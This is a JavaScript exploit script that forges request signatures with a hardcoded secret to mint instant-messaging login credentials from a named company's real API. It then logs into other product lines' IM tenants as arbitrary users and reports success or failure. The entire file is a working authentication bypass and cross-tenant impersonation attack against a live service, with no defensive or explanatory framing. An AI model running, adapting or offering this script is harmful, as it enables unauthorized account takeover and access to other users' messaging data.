// im_tenant_login.js — 验证其他产品线 IM 租户的伪造 userSig 可登录
require('./shim');
const TIM = require('tim-js-sdk');
const https = require('https');
const crypto = require('crypto');
const sleep = ms => new Promise(r => setTimeout(r, ms));
function mint(userId, channel) {
  return new Promise((resolve, reject) => {
    const t = Date.now().toString();
    const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
    const qs = `signature=${sig}&time=${t}&userId=${encodeURIComponent(userId)}&channel=${channel}`;
    https.get(`https://apis.ubtrobot.com/im/getInfo?${qs}`, res => {
      let b = ''; res.on('data', d => b += d);
      res.on('end', () => { try {
        const j = JSON.parse(b);
        resolve({ sdkappid: parseInt(j.returnMap.appidAt3rd, 10), userSig: j.returnMap.userSig });
      } catch (e) { reject(e); } });
    }).on('error', reject);
  });
}
(async () => {
  const [userId, channel] = [process.argv[2], process.argv[3]];
  const { sdkappid, userSig } = await mint(userId, channel);
  console.log(`[*] channel=${channel} -> SDKAppID=${sdkappid}`);
  const tim = TIM.create({ SDKAppID: sdkappid });
  tim.setLogLevel(0);
  try {
    const res = await tim.login({ userID: <账户_01>, userSig });
    console.log(`[+] 租户 ${sdkappid} 登录成功! actionStatus=${res.data.actionStatus} tinyID=${res.data.tinyID}`);
    await tim.logout();
  } catch (e) { console.log(`[-] 租户 ${sdkappid} 登录失败:`, e.code, e.message); }
  process.exit(0);
})().catch(e => { console.error('[-]', e.message); process.exit(2); });
